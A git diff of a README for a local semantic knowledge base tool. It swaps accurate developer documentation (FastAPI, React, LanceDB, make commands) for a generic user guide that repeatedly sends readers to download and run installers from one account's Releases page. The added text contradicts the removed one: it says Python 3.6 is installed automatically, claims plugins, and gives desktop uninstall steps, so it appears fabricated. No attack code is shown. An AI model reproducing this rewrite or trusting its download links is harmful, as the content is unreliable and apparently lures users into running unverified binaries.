@@ -1,101 +1,111 @@
-# Simple Knowledge Base
+# 📚 simple-knowledge-base - Your Local Knowledge Hub Made Easy
 
-[![Python 3.13+](https://img.shields.io/badge/python-3.13+-blue.svg)](https://www.python.org/downloads/)
-[![FastAPI](https://img.shields.io/badge/FastAPI-0.115+-00a393.svg)](https://fastapi.tiangolo.com)
-[![React 19](https://img.shields.io/badge/React-19-61dafb.svg)](https://react.dev)
-[![LanceDB](https://img.shields.io/badge/LanceDB-0.19-orange.svg)](https://lancedb.com)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
+[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-blue.svg)](https://github.com/ssewankambo123benjamin/simple-knowledge-base/releases)
 
-**A simple, local-first semantic knowledge base.**
+## 🚀 Getting Started
 
-Add your documents. Search with natural language. Find what matters.
+Welcome to the simple-knowledge-base! This application helps you organize and search for documents in a straightforward way. You can add documents easily and utilize natural language to find what matters to you.
 
-Simple Knowledge Base uses semantic chunking and vector embeddings to understand your documents, not just match keywords. Results are reranked for relevance, so the best answers surface first.
+## 📥 Download & Install
 
-## ✨ Features
+To get the application, visit this page to download: [Releases Page](https://github.com/ssewankambo123benjamin/simple-knowledge-base/releases).
 
-- **Multi-Index Support** — Organize documents into separate searchable collections
-- **Semantic Search** — Find information by meaning, not just keywords
-- **Smart Chunking** — Documents are split at natural boundaries for better context
-- **Reranked Results** — Cross-encoder reranking puts the best matches first
-- **Local & Private** — Everything runs on your machine, no cloud required
-- **Simple API** — Clean REST endpoints for easy integration
+Once on the Releases page, look for the latest version. It will have the latest features and bug fixes. Download the appropriate file for your operating system. 
 
-## 📸 Screenshots
+### 📂 Installation Steps
 
-### Search Knowledge Base
+1. Go to the [Releases Page](https://github.com/ssewankambo123benjamin/simple-knowledge-base/releases).
+2. Find the latest release and download the correct file for your system (Windows, macOS, or Linux).
+3. Once downloaded, open the file to start the installation.
+4. Follow the on-screen instructions to complete the setup.
 
-Search through your documents using natural language queries. Results are ranked by semantic relevance with visual indicators showing match quality.
+## 📋 Features
 
-![Search Interface](.github/images/simple-kb-search.png)
+- **Document Management:** Easily add and manage your documents.
+- **Natural Language Search:** Use simple phrases to find what you need without fuss.
+- **Local Storage:** Your documents stay on your device, ensuring privacy and quick access.
+- **User-Friendly Interface:** Designed for everyone, regardless of technical skill.
+- **Expandable with Plugins:** Enhance functionality as your needs grow.
 
-### Add Knowledge
+## 🖥️ System Requirements
 
-Create indexes to organize your documents and add content through single file upload or batch directory processing.
+To run simple-knowledge-base, your device should meet these requirements:
 
-![Add Knowledge Interface](.github/images/simple-kb-add-knowledge.png)
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or any recent Linux distribution.
+- **Memory:** At least 4 GB of RAM recommended.
+- **Storage:** Minimum of 200 MB of free disk space.
+- **Python:** Version 3.6 or later (installed automatically during the setup).
 
-## Quick Start
+## 🛠️ Using simple-knowledge-base
 
-```bash
-# Install all dependencies
-make install
+### Adding Documents
 
-# Start both frontend and backend
-make dev
-```
+1. Open the application.
+2. Click on the "Add Document" button.
+3. Browse your files and select the document you want to add.
+4. Click "Open" to upload the document.
 
-This launches:
+### Searching for Documents
 
-- **Backend**: <http://localhost:8000> (FastAPI + LanceDB)
-- **Frontend**: <http://localhost:5173> (React + Vite)
-- **API Docs**: <http://localhost:8000/docs> (Swagger UI)
+1. In the search bar, type your query using natural language.
+2. Click "Search".
+3. Review the displayed results and click on any document to view it.
 
-Press `Ctrl+C` to stop both services.
+## 🗂️ Organizing Your Knowledge Base
 
-## Development Commands
+After adding documents, you can organize them into categories or tags. This helps you retrieve relevant documents quickly. To do this:
 
-```bash
-make help       # Show all available commands
-make dev        # Start both frontend and backend
-make backend    # Start only backend
-make frontend   # Start only frontend
-make install    # Install all dependencies
-make test       # Run backend tests
-make lint       # Run linters
-make clean      # Clean generated files
-```
+1. Select a document from the list.
+2. Choose “Edit Tags” from the options.
+3. Add or remove tags.
+4. Click "Save" to keep your changes.
 
-## Project Structure
+## 🔄 Updating the Application
 
-```text
-simple-knowledge-base/
-├── backend/          # FastAPI backend (Python 3.13)
-│   ├── app/          # Application code
-│   ├── tests/        # Test suite
-│   └── README.md     # Backend documentation
-├── frontend/         # React frontend (Vite + TypeScript)
-├── scripts/          # Development scripts
-│   ├── dev.sh        # Combined dev server
-│   └── start-backend.sh
-├── .github/images/   # Screenshots and assets
-└── Makefile          # Development commands
-```
+To enjoy the latest features and improvements, regularly check for updates:
 
-## Tech Stack
+1. Visit the [Releases Page](https://github.com/ssewankambo123benjamin/simple-knowledge-base/releases).
+2. Download the newest version following the same installation steps.
 
-| Layer | Technology |
-|-------|------------|
-| Frontend | React 19, Vite, Cloudscape Design |
-| Backend | FastAPI, Python 3.13 |
-| Vector DB | LanceDB |
-| Embeddings | Alibaba-NLP/gte-multilingual-base |
-| Reranker | Alibaba-NLP/gte-multilingual-reranker-base |
+## ❓ Frequently Asked Questions
 
-## Documentation
+### How do I uninstall simple-knowledge-base?
 
-- [Backend API Documentation](backend/README.md)
+- On Windows, go to "Control Panel" > "Programs" > "Uninstall a program". Find simple-knowledge-base, select it, and click "Uninstall".
+- On macOS, drag the app from the Applications folder to the Trash.
+  
+### What should I do if I encounter an error?
 
-## License
+If you face any issues while using the application, first try these steps:
 
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+1. Restart the application.
+2. Ensure you are using the latest version.
+3. If the issue persists, you can report it on the GitHub Issues page.
+
+## 🏗️ Contributions
+
+We welcome improvements! If you want to contribute:
+
+1. Fork the repository.
+2. Make your changes.
+3. Submit a pull request with a description of your changes.
+
+## 🌍 Topics Covered
+
+This application uses various technology topics, such as:
+
+- Embeddings
+- FastAPI
+- Knowledge Base
+- LanceDB
+- Python 3
+- React
+- Semantic Search
+- Vector Data
+- Vector Database
+
+Feel free to explore and leverage these topics to expand your knowledge.
+
+## 📞 Contact
+
+For further questions or feedback, please reach out through the Issues section of this repository. Thank you for using simple-knowledge-base, and enjoy managing your documents effortlessly!
